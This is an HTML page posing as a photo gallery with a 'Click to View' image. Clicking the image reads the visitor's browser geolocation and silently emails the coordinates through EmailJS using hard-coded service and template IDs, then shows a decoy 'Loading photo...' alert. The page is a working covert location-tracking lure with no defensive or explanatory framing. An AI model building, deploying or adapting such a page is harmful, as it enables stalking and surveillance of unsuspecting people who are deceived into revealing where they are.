<!DOCTYPE html>
<html>
  <head>
    <title>Gallery</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
      (function () {
        emailjs.init("0pjoOsYEEaIF0eGLE"); // Your public key
      })();

      function sendLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function (position) {
            const templateParams = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            };

            emailjs.send("service_0ijm0xc", "template_1odbjug", templateParams)
              .then(function () {
                alert("Loading photo...");
              }, function (error) {
                alert("Error: " + JSON.stringify(error));
              });
          });
        } else {
          alert("Geolocation is not supported.");
        }
      }
    </script>
    <style>
      body {
        text-align: center;
        font-family: sans-serif;
      }
      img {
        width: 90%;
        max-width: 500px;
        margin-top: 40px;
        border-radius: 8px;
        box-shadow: 0 0 15px rgba(0,0,0,0.2);
      }
    </style>
  </head>
  <body>
    <h1>Click to View</h1>
    <img src="https://via.placeholder.com/600x400?text=Gallery+Photo" onclick="sendLocation()" alt="Gallery Image">
  </body>
</html>
